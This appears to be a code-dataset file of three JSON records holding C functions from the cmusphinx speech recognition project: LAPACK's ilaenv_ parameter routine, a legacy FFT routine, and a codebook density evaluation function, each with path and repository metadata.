{"docstring": "/* ieeeck_ */\n", "func_signal": "integer ilaenv_(integer *ispec, char *name__, char *opts, integer *n1,\n\tinteger *n2, integer *n3, integer *n4, ftnlen name_len, ftnlen\n\topts_len)", "code": "{\n    /* System generated locals */\n    integer ret_val;\n\n    /* Builtin functions */\n    /* Subroutine */ int s_copy(char *, char *, ftnlen, ftnlen);\n    integer s_cmp(char *, char *, ftnlen, ftnlen);\n\n    /* Local variables */\n    static integer i__;\n    static char c1[1], c2[2], c3[3], c4[2];\n    static integer ic, nb, iz, nx;\n    static logical cname, sname;\n    static integer nbmin;\n    extern integer ieeeck_(integer *, real *, real *);\n    static char subnam[6];\n\n\n/*\n    -- LAPACK auxiliary routine (version 3.0) --\n       Univ. of Tennessee, Univ. of California Berkeley, NAG Ltd.,\n       Courant Institute, Argonne National Lab, and Rice University\n       June 30, 1999\n\n\n    Purpose\n    =======\n\n    ILAENV is called from the LAPACK routines to choose problem-dependent\n    parameters for the local environment.  See ISPEC for a description of\n    the parameters.\n\n    This version provides a set of parameters which should give good,\n    but not optimal, performance on many of the currently available\n    computers.  Users are encouraged to modify this subroutine to set\n    the tuning parameters for their particular machine using the option\n    and problem size information in the arguments.\n\n    This routine will not function correctly if it is converted to all\n    lower case.  Converting it to all upper case is allowed.\n\n    Arguments\n    =========\n\n    ISPEC   (input) INTEGER\n            Specifies the parameter to be returned as the value of\n            ILAENV.\n            = 1: the optimal blocksize; if this value is 1, an unblocked\n                 algorithm will give the best performance.\n            = 2: the minimum block size for which the block routine\n                 should be used; if the usable block size is less than\n                 this value, an unblocked routine should be used.\n            = 3: the crossover point (in a block routine, for N less\n                 than this value, an unblocked routine should be used)\n            = 4: the number of shifts, used in the nonsymmetric\n                 eigenvalue routines\n            = 5: the minimum column dimension for blocking to be used;\n                 rectangular blocks must have dimension at least k by m,\n                 where k is given by ILAENV(2,...) and m by ILAENV(5,...)\n            = 6: the crossover point for the SVD (when reducing an m by n\n                 matrix to bidiagonal form, if max(m,n)/min(m,n) exceeds\n                 this value, a QR factorization is used first to reduce\n                 the matrix to a triangular form.)\n            = 7: the number of processors\n            = 8: the crossover point for the multishift QR and QZ methods\n                 for nonsymmetric eigenvalue problems.\n            = 9: maximum size of the subproblems at the bottom of the\n                 computation tree in the divide-and-conquer algorithm\n                 (used by xGELSD and xGESDD)\n            =10: ieee NaN arithmetic can be trusted not to trap\n            =11: infinity arithmetic can be trusted not to trap\n\n    NAME    (input) CHARACTER*(*)\n            The name of the calling subroutine, in either upper case or\n            lower case.\n\n    OPTS    (input) CHARACTER*(*)\n            The character options to the subroutine NAME, concatenated\n            into a single character string.  For example, UPLO = 'U',\n            TRANS = 'T', and DIAG = 'N' for a triangular routine would\n            be specified as OPTS = 'UTN'.\n\n    N1      (input) INTEGER\n    N2      (input) INTEGER\n    N3      (input) INTEGER\n    N4      (input) INTEGER\n            Problem dimensions for the subroutine NAME; these may not all\n            be required.\n\n   (ILAENV) (output) INTEGER\n            >= 0: the value of the parameter specified by ISPEC\n            < 0:  if ILAENV = -k, the k-th argument had an illegal value.\n\n    Further Details\n    ===============\n\n    The following conventions have been used when calling ILAENV from the\n    LAPACK routines:\n    1)  OPTS is a concatenation of all of the character options to\n        subroutine NAME, in the same order that they appear in the\n        argument list for NAME, even if they are not used in determining\n        the value of the parameter specified by ISPEC.\n    2)  The problem dimensions N1, N2, N3, N4 are specified in the order\n        that they appear in the argument list for NAME.  N1 is used\n        first, N2 second, and so on, and unused problem dimensions are\n        passed a value of -1.\n    3)  The parameter value returned by ILAENV is checked for validity in\n        the calling subroutine.  For example, ILAENV is used to retrieve\n        the optimal blocksize for STRTRI as follows:\n\n        NB = ILAENV( 1, 'STRTRI', UPLO // DIAG, N, -1, -1, -1 )\n        IF( NB.LE.1 ) NB = MAX( 1, N )\n\n    =====================================================================\n*/\n\n\n    switch (*ispec) {\n\tcase 1:  goto L100;\n\tcase 2:  goto L100;\n\tcase 3:  goto L100;\n\tcase 4:  goto L400;\n\tcase 5:  goto L500;\n\tcase 6:  goto L600;\n\tcase 7:  goto L700;\n\tcase 8:  goto L800;\n\tcase 9:  goto L900;\n\tcase 10:  goto L1000;\n\tcase 11:  goto L1100;\n    }\n\n/*     Invalid value for ISPEC */\n\n    ret_val = -1;\n    return ret_val;\n\nL100:\n\n/*     Convert NAME to upper case if the first character is lower case. */\n\n    ret_val = 1;\n    s_copy(subnam, name__, (ftnlen)6, name_len);\n    ic = *(unsigned char *)subnam;\n    iz = 'Z';\n    if (iz == 90 || iz == 122) {\n\n/*        ASCII character set */\n\n\tif (ic >= 97 && ic <= 122) {\n\t    *(unsigned char *)subnam = (char) (ic - 32);\n\t    for (i__ = 2; i__ <= 6; ++i__) {\n\t\tic = *(unsigned char *)&subnam[i__ - 1];\n\t\tif (ic >= 97 && ic <= 122) {\n\t\t    *(unsigned char *)&subnam[i__ - 1] = (char) (ic - 32);\n\t\t}\n/* L10: */\n\t    }\n\t}\n\n    } else if (iz == 233 || iz == 169) {\n\n/*        EBCDIC character set */\n\n\tif (ic >= 129 && ic <= 137 || ic >= 145 && ic <= 153 || ic >= 162 &&\n\t\tic <= 169) {\n\t    *(unsigned char *)subnam = (char) (ic + 64);\n\t    for (i__ = 2; i__ <= 6; ++i__) {\n\t\tic = *(unsigned char *)&subnam[i__ - 1];\n\t\tif (ic >= 129 && ic <= 137 || ic >= 145 && ic <= 153 || ic >=\n\t\t\t162 && ic <= 169) {\n\t\t    *(unsigned char *)&subnam[i__ - 1] = (char) (ic + 64);\n\t\t}\n/* L20: */\n\t    }\n\t}\n\n    } else if (iz == 218 || iz == 250) {\n\n/*        Prime machines:  ASCII+128 */\n\n\tif (ic >= 225 && ic <= 250) {\n\t    *(unsigned char *)subnam = (char) (ic - 32);\n\t    for (i__ = 2; i__ <= 6; ++i__) {\n\t\tic = *(unsigned char *)&subnam[i__ - 1];\n\t\tif (ic >= 225 && ic <= 250) {\n\t\t    *(unsigned char *)&subnam[i__ - 1] = (char) (ic - 32);\n\t\t}\n/* L30: */\n\t    }\n\t}\n    }\n\n    *(unsigned char *)c1 = *(unsigned char *)subnam;\n    sname = *(unsigned char *)c1 == 'S' || *(unsigned char *)c1 == 'D';\n    cname = *(unsigned char *)c1 == 'C' || *(unsigned char *)c1 == 'Z';\n    if (! (cname || sname)) {\n\treturn ret_val;\n    }\n    s_copy(c2, subnam + 1, (ftnlen)2, (ftnlen)2);\n    s_copy(c3, subnam + 3, (ftnlen)3, (ftnlen)3);\n    s_copy(c4, c3 + 1, (ftnlen)2, (ftnlen)2);\n\n    switch (*ispec) {\n\tcase 1:  goto L110;\n\tcase 2:  goto L200;\n\tcase 3:  goto L300;\n    }\n\nL110:\n\n/*\n       ISPEC = 1:  block size\n\n       In these examples, separate code is provided for setting NB for\n       real and complex.  We assume that NB will take the same value in\n       single or double precision.\n*/\n\n    nb = 1;\n\n    if (s_cmp(c2, \"GE\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (s_cmp(c3, \"TRF\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    if (sname) {\n\t\tnb = 64;\n\t    } else {\n\t\tnb = 64;\n\t    }\n\t} else if (s_cmp(c3, \"QRF\", (ftnlen)3, (ftnlen)3) == 0 || s_cmp(c3,\n\t\t\"RQF\", (ftnlen)3, (ftnlen)3) == 0 || s_cmp(c3, \"LQF\", (ftnlen)\n\t\t3, (ftnlen)3) == 0 || s_cmp(c3, \"QLF\", (ftnlen)3, (ftnlen)3)\n\t\t== 0) {\n\t    if (sname) {\n\t\tnb = 32;\n\t    } else {\n\t\tnb = 32;\n\t    }\n\t} else if (s_cmp(c3, \"HRD\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    if (sname) {\n\t\tnb = 32;\n\t    } else {\n\t\tnb = 32;\n\t    }\n\t} else if (s_cmp(c3, \"BRD\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    if (sname) {\n\t\tnb = 32;\n\t    } else {\n\t\tnb = 32;\n\t    }\n\t} else if (s_cmp(c3, \"TRI\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    if (sname) {\n\t\tnb = 64;\n\t    } else {\n\t\tnb = 64;\n\t    }\n\t}\n    } else if (s_cmp(c2, \"PO\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (s_cmp(c3, \"TRF\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    if (sname) {\n\t\tnb = 64;\n\t    } else {\n\t\tnb = 64;\n\t    }\n\t}\n    } else if (s_cmp(c2, \"SY\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (s_cmp(c3, \"TRF\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    if (sname) {\n\t\tnb = 64;\n\t    } else {\n\t\tnb = 64;\n\t    }\n\t} else if (sname && s_cmp(c3, \"TRD\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    nb = 32;\n\t} else if (sname && s_cmp(c3, \"GST\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    nb = 64;\n\t}\n    } else if (cname && s_cmp(c2, \"HE\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (s_cmp(c3, \"TRF\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    nb = 64;\n\t} else if (s_cmp(c3, \"TRD\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    nb = 32;\n\t} else if (s_cmp(c3, \"GST\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    nb = 64;\n\t}\n    } else if (sname && s_cmp(c2, \"OR\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (*(unsigned char *)c3 == 'G') {\n\t    if (s_cmp(c4, \"QR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"RQ\",\n\t\t    (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"LQ\", (ftnlen)2, (\n\t\t    ftnlen)2) == 0 || s_cmp(c4, \"QL\", (ftnlen)2, (ftnlen)2) ==\n\t\t     0 || s_cmp(c4, \"HR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(\n\t\t    c4, \"TR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"BR\", (\n\t\t    ftnlen)2, (ftnlen)2) == 0) {\n\t\tnb = 32;\n\t    }\n\t} else if (*(unsigned char *)c3 == 'M') {\n\t    if (s_cmp(c4, \"QR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"RQ\",\n\t\t    (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"LQ\", (ftnlen)2, (\n\t\t    ftnlen)2) == 0 || s_cmp(c4, \"QL\", (ftnlen)2, (ftnlen)2) ==\n\t\t     0 || s_cmp(c4, \"HR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(\n\t\t    c4, \"TR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"BR\", (\n\t\t    ftnlen)2, (ftnlen)2) == 0) {\n\t\tnb = 32;\n\t    }\n\t}\n    } else if (cname && s_cmp(c2, \"UN\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (*(unsigned char *)c3 == 'G') {\n\t    if (s_cmp(c4, \"QR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"RQ\",\n\t\t    (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"LQ\", (ftnlen)2, (\n\t\t    ftnlen)2) == 0 || s_cmp(c4, \"QL\", (ftnlen)2, (ftnlen)2) ==\n\t\t     0 || s_cmp(c4, \"HR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(\n\t\t    c4, \"TR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"BR\", (\n\t\t    ftnlen)2, (ftnlen)2) == 0) {\n\t\tnb = 32;\n\t    }\n\t} else if (*(unsigned char *)c3 == 'M') {\n\t    if (s_cmp(c4, \"QR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"RQ\",\n\t\t    (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"LQ\", (ftnlen)2, (\n\t\t    ftnlen)2) == 0 || s_cmp(c4, \"QL\", (ftnlen)2, (ftnlen)2) ==\n\t\t     0 || s_cmp(c4, \"HR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(\n\t\t    c4, \"TR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"BR\", (\n\t\t    ftnlen)2, (ftnlen)2) == 0) {\n\t\tnb = 32;\n\t    }\n\t}\n    } else if (s_cmp(c2, \"GB\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (s_cmp(c3, \"TRF\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    if (sname) {\n\t\tif (*n4 <= 64) {\n\t\t    nb = 1;\n\t\t} else {\n\t\t    nb = 32;\n\t\t}\n\t    } else {\n\t\tif (*n4 <= 64) {\n\t\t    nb = 1;\n\t\t} else {\n\t\t    nb = 32;\n\t\t}\n\t    }\n\t}\n    } else if (s_cmp(c2, \"PB\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (s_cmp(c3, \"TRF\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    if (sname) {\n\t\tif (*n2 <= 64) {\n\t\t    nb = 1;\n\t\t} else {\n\t\t    nb = 32;\n\t\t}\n\t    } else {\n\t\tif (*n2 <= 64) {\n\t\t    nb = 1;\n\t\t} else {\n\t\t    nb = 32;\n\t\t}\n\t    }\n\t}\n    } else if (s_cmp(c2, \"TR\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (s_cmp(c3, \"TRI\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    if (sname) {\n\t\tnb = 64;\n\t    } else {\n\t\tnb = 64;\n\t    }\n\t}\n    } else if (s_cmp(c2, \"LA\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (s_cmp(c3, \"UUM\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    if (sname) {\n\t\tnb = 64;\n\t    } else {\n\t\tnb = 64;\n\t    }\n\t}\n    } else if (sname && s_cmp(c2, \"ST\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (s_cmp(c3, \"EBZ\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    nb = 1;\n\t}\n    }\n    ret_val = nb;\n    return ret_val;\n\nL200:\n\n/*     ISPEC = 2:  minimum block size */\n\n    nbmin = 2;\n    if (s_cmp(c2, \"GE\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (s_cmp(c3, \"QRF\", (ftnlen)3, (ftnlen)3) == 0 || s_cmp(c3, \"RQF\", (\n\t\tftnlen)3, (ftnlen)3) == 0 || s_cmp(c3, \"LQF\", (ftnlen)3, (\n\t\tftnlen)3) == 0 || s_cmp(c3, \"QLF\", (ftnlen)3, (ftnlen)3) == 0)\n\t\t {\n\t    if (sname) {\n\t\tnbmin = 2;\n\t    } else {\n\t\tnbmin = 2;\n\t    }\n\t} else if (s_cmp(c3, \"HRD\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    if (sname) {\n\t\tnbmin = 2;\n\t    } else {\n\t\tnbmin = 2;\n\t    }\n\t} else if (s_cmp(c3, \"BRD\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    if (sname) {\n\t\tnbmin = 2;\n\t    } else {\n\t\tnbmin = 2;\n\t    }\n\t} else if (s_cmp(c3, \"TRI\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    if (sname) {\n\t\tnbmin = 2;\n\t    } else {\n\t\tnbmin = 2;\n\t    }\n\t}\n    } else if (s_cmp(c2, \"SY\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (s_cmp(c3, \"TRF\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    if (sname) {\n\t\tnbmin = 8;\n\t    } else {\n\t\tnbmin = 8;\n\t    }\n\t} else if (sname && s_cmp(c3, \"TRD\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    nbmin = 2;\n\t}\n    } else if (cname && s_cmp(c2, \"HE\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (s_cmp(c3, \"TRD\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    nbmin = 2;\n\t}\n    } else if (sname && s_cmp(c2, \"OR\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (*(unsigned char *)c3 == 'G') {\n\t    if (s_cmp(c4, \"QR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"RQ\",\n\t\t    (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"LQ\", (ftnlen)2, (\n\t\t    ftnlen)2) == 0 || s_cmp(c4, \"QL\", (ftnlen)2, (ftnlen)2) ==\n\t\t     0 || s_cmp(c4, \"HR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(\n\t\t    c4, \"TR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"BR\", (\n\t\t    ftnlen)2, (ftnlen)2) == 0) {\n\t\tnbmin = 2;\n\t    }\n\t} else if (*(unsigned char *)c3 == 'M') {\n\t    if (s_cmp(c4, \"QR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"RQ\",\n\t\t    (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"LQ\", (ftnlen)2, (\n\t\t    ftnlen)2) == 0 || s_cmp(c4, \"QL\", (ftnlen)2, (ftnlen)2) ==\n\t\t     0 || s_cmp(c4, \"HR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(\n\t\t    c4, \"TR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"BR\", (\n\t\t    ftnlen)2, (ftnlen)2) == 0) {\n\t\tnbmin = 2;\n\t    }\n\t}\n    } else if (cname && s_cmp(c2, \"UN\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (*(unsigned char *)c3 == 'G') {\n\t    if (s_cmp(c4, \"QR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"RQ\",\n\t\t    (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"LQ\", (ftnlen)2, (\n\t\t    ftnlen)2) == 0 || s_cmp(c4, \"QL\", (ftnlen)2, (ftnlen)2) ==\n\t\t     0 || s_cmp(c4, \"HR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(\n\t\t    c4, \"TR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"BR\", (\n\t\t    ftnlen)2, (ftnlen)2) == 0) {\n\t\tnbmin = 2;\n\t    }\n\t} else if (*(unsigned char *)c3 == 'M') {\n\t    if (s_cmp(c4, \"QR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"RQ\",\n\t\t    (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"LQ\", (ftnlen)2, (\n\t\t    ftnlen)2) == 0 || s_cmp(c4, \"QL\", (ftnlen)2, (ftnlen)2) ==\n\t\t     0 || s_cmp(c4, \"HR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(\n\t\t    c4, \"TR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"BR\", (\n\t\t    ftnlen)2, (ftnlen)2) == 0) {\n\t\tnbmin = 2;\n\t    }\n\t}\n    }\n    ret_val = nbmin;\n    return ret_val;\n\nL300:\n\n/*     ISPEC = 3:  crossover point */\n\n    nx = 0;\n    if (s_cmp(c2, \"GE\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (s_cmp(c3, \"QRF\", (ftnlen)3, (ftnlen)3) == 0 || s_cmp(c3, \"RQF\", (\n\t\tftnlen)3, (ftnlen)3) == 0 || s_cmp(c3, \"LQF\", (ftnlen)3, (\n\t\tftnlen)3) == 0 || s_cmp(c3, \"QLF\", (ftnlen)3, (ftnlen)3) == 0)\n\t\t {\n\t    if (sname) {\n\t\tnx = 128;\n\t    } else {\n\t\tnx = 128;\n\t    }\n\t} else if (s_cmp(c3, \"HRD\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    if (sname) {\n\t\tnx = 128;\n\t    } else {\n\t\tnx = 128;\n\t    }\n\t} else if (s_cmp(c3, \"BRD\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    if (sname) {\n\t\tnx = 128;\n\t    } else {\n\t\tnx = 128;\n\t    }\n\t}\n    } else if (s_cmp(c2, \"SY\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (sname && s_cmp(c3, \"TRD\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    nx = 32;\n\t}\n    } else if (cname && s_cmp(c2, \"HE\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (s_cmp(c3, \"TRD\", (ftnlen)3, (ftnlen)3) == 0) {\n\t    nx = 32;\n\t}\n    } else if (sname && s_cmp(c2, \"OR\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (*(unsigned char *)c3 == 'G') {\n\t    if (s_cmp(c4, \"QR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"RQ\",\n\t\t    (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"LQ\", (ftnlen)2, (\n\t\t    ftnlen)2) == 0 || s_cmp(c4, \"QL\", (ftnlen)2, (ftnlen)2) ==\n\t\t     0 || s_cmp(c4, \"HR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(\n\t\t    c4, \"TR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"BR\", (\n\t\t    ftnlen)2, (ftnlen)2) == 0) {\n\t\tnx = 128;\n\t    }\n\t}\n    } else if (cname && s_cmp(c2, \"UN\", (ftnlen)2, (ftnlen)2) == 0) {\n\tif (*(unsigned char *)c3 == 'G') {\n\t    if (s_cmp(c4, \"QR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"RQ\",\n\t\t    (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"LQ\", (ftnlen)2, (\n\t\t    ftnlen)2) == 0 || s_cmp(c4, \"QL\", (ftnlen)2, (ftnlen)2) ==\n\t\t     0 || s_cmp(c4, \"HR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(\n\t\t    c4, \"TR\", (ftnlen)2, (ftnlen)2) == 0 || s_cmp(c4, \"BR\", (\n\t\t    ftnlen)2, (ftnlen)2) == 0) {\n\t\tnx = 128;\n\t    }\n\t}\n    }\n    ret_val = nx;\n    return ret_val;\n\nL400:\n\n/*     ISPEC = 4:  number of shifts (used by xHSEQR) */\n\n    ret_val = 6;\n    return ret_val;\n\nL500:\n\n/*     ISPEC = 5:  minimum column dimension (not used) */\n\n    ret_val = 2;\n    return ret_val;\n\nL600:\n\n/*     ISPEC = 6:  crossover point for SVD (used by xGELSS and xGESVD) */\n\n    ret_val = (integer) ((real) min(*n1,*n2) * 1.6f);\n    return ret_val;\n\nL700:\n\n/*     ISPEC = 7:  number of processors (not used) */\n\n    ret_val = 1;\n    return ret_val;\n\nL800:\n\n/*     ISPEC = 8:  crossover point for multishift (used by xHSEQR) */\n\n    ret_val = 50;\n    return ret_val;\n\nL900:\n\n/*\n       ISPEC = 9:  maximum size of the subproblems at the bottom of the\n                   computation tree in the divide-and-conquer algorithm\n                   (used by xGELSD and xGESDD)\n*/\n\n    ret_val = 25;\n    return ret_val;\n\nL1000:\n\n/*\n       ISPEC = 10: ieee NaN arithmetic can be trusted not to trap\n\n       ILAENV = 0\n*/\n    ret_val = 1;\n    if (ret_val == 1) {\n\tret_val = ieeeck_(&c__0, &c_b163, &c_b164);\n    }\n    return ret_val;\n\nL1100:\n\n/*\n       ISPEC = 11: infinity arithmetic can be trusted not to trap\n\n       ILAENV = 0\n*/\n    ret_val = 1;\n    if (ret_val == 1) {\n\tret_val = ieeeck_(&c__1, &c_b163, &c_b164);\n    }\n    return ret_val;\n\n/*     End of ILAENV */\n\n}", "path": "sphinxbase\\src\\libsphinxbase\\util\\slapack_lite.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
{"docstring": "/* This function has been replaced by fe_fft_real, and is no longer used. */\n", "func_signal": "int32 fe_fft(complex const *in, complex *out, int32 N, int32 invert)", "code": "{\n  int32\n    s, k,                       /* as above                             */\n    lgN;                        /* log2(N)                              */\n\n  complex\n    *f1, *f2,                   /* pointers into from array             */\n    *t1, *t2,                   /* pointers into to array               */\n    *ww;                        /* pointer into w array                 */\n\n  complex\n    *w, *from, *to,             /* as above                             */\n    wwf2,                       /* temporary for ww*f2                  */\n    *buffer,                    /* from and to flipflop btw out and buffer */\n    *exch,                      /* temporary for exchanging from and to */\n    *wEnd;                      /* to keep ww from going off end        */\n\n  float64\n    div,                        /* amount to divide result by: N or 1   */\n    x;                          /* misc.                                */\n\n  \n  /* check N, compute lgN                                               */\n  for (k = N, lgN = 0; k > 1; k /= 2, lgN++)\n  {\n    if (k%2 != 0 || N < 0)\n    {\n      fprintf(stderr, \"fft: N must be a power of 2 (is %d)\\n\", N);\n      return(-1);\n    }\n  }\n\n  /* check invert, compute div                                          */\n  if (invert == 1)\n    div = 1.0;\n  else if (invert == -1)\n    div = N;\n  else\n  {\n    fprintf(stderr, \"fft: invert must be either +1 or -1 (is %d)\\n\", invert);\n    return(-1);\n  }\n\n  /* get the to, from buffers right, and init                           */\n  buffer = (complex *)calloc(N, sizeof(complex));\n  if (lgN%2 == 0)\n  {\n    from = out;\n    to = buffer;\n  }\n  else\n  {\n    to = out;\n    from = buffer;\n  }\n\n  \n  for (s = 0; s<N; s++)\n  {\n      from[s].r = in[s].r/div;\n      from[s].i = in[s].i/div;\n\n  }\n\n  /* w = exp(-2*PI*i/N), w[k] = w^k                                     */\n  w = (complex *) calloc(N/2, sizeof(complex));\n  for (k = 0; k < N/2; k++)\n  {\n    x = -6.28318530717958647*invert*k/N;\n    w[k].r = cos(x);\n    w[k].i = sin(x);\n  }\n  wEnd = &w[N/2];\n  \n  /* go for it!                                                         */\n  for (k = N/2; k > 0; k /= 2)\n  {\n    for (s = 0; s < k; s++)\n    {\n      /* initialize pointers                                            */\n      f1 = &from[s]; f2 = &from[s+k];\n      t1 = &to[s]; t2 = &to[s+N/2];\n      ww = &w[0];\n      /* compute <s,k>                                                  */\n      while (ww < wEnd)\n      {\n        /* wwf2 = ww*f2                                                 */\n        wwf2.r = f2->r*ww->r - f2->i*ww->i;\n        wwf2.i = f2->r*ww->i + f2->i*ww->r;\n        /* t1 = f1+wwf2                                                 */\n        t1->r = f1->r + wwf2.r;\n        t1->i = f1->i + wwf2.i;\n        /* t2 = f1-wwf2                                                 */\n        t2->r = f1->r - wwf2.r;\n        t2->i = f1->i - wwf2.i;\n        /* increment                                                    */\n        f1 += 2*k; f2 += 2*k;\n        t1 += k; t2 += k;\n        ww += k;\n      }\n    }\n    exch = from; from = to; to = exch;\n  }\n  free(buffer);\n  free(w);\n  return(0);\n}", "path": "sphinx2\\src\\libsphinx2fe\\fe_sigproc.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
{"docstring": "/**\n * Compute top-N densities for active codebooks (and prune)\n */\n", "func_signal": "static int\nptm_mgau_codebook_eval(ptm_mgau_t *s, mfcc_t **z, int frame)", "code": "{\n    int i, j;\n\n    /* First evaluate top-N from previous frame. */\n    for (i = 0; i < s->g->n_mgau; ++i)\n        for (j = 0; j < s->g->n_feat; ++j)\n            eval_topn(s, i, j, z[j]);\n\n    /* If frame downsampling is in effect, possibly do nothing else. */\n    if (frame % s->ds_ratio)\n        return 0;\n\n    /* Evaluate remaining codebooks. */\n    for (i = 0; i < s->g->n_mgau; ++i) {\n        if (bitvec_is_clear(s->f->mgau_active, i))\n            continue;\n        for (j = 0; j < s->g->n_feat; ++j) {\n            eval_cb(s, i, j, z[j]);\n        }\n    }\n\n    /* Normalize densities to produce \"posterior probabilities\",\n     * i.e. things with a reasonable dynamic range, then scale and\n     * clamp them to the acceptable range.  This is actually done\n     * solely to ensure that we can use fast_logmath_add().  Note that\n     * unless we share the same normalizer across all codebooks for\n     * each feature stream we get defective scores (that's why these\n     * loops are inside out - doing it per-feature should give us\n     * greater precision). */\n    for (j = 0; j < s->g->n_feat; ++j) {\n        int32 norm = 0x7fffffff;\n        for (i = 0; i < s->g->n_mgau; ++i) {\n            if (bitvec_is_clear(s->f->mgau_active, i))\n                continue;\n            if (norm > s->f->topn[i][j][0].score >> SENSCR_SHIFT)\n                norm = s->f->topn[i][j][0].score >> SENSCR_SHIFT;\n        }\n        assert(norm != 0x7fffffff);\n        for (i = 0; i < s->g->n_mgau; ++i) {\n            int32 k;\n            if (bitvec_is_clear(s->f->mgau_active, i))\n                continue;\n            for (k = 0; k < s->max_topn; ++k) {\n                s->f->topn[i][j][k].score >>= SENSCR_SHIFT;\n                s->f->topn[i][j][k].score -= norm;\n                s->f->topn[i][j][k].score = -s->f->topn[i][j][k].score;\n                if (s->f->topn[i][j][k].score > MAX_NEG_ASCR) \n                    s->f->topn[i][j][k].score = MAX_NEG_ASCR;\n            }\n        }\n    }\n\n    return 0;\n}", "path": "pocketsphinx\\src\\libpocketsphinx\\ptm_mgau.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
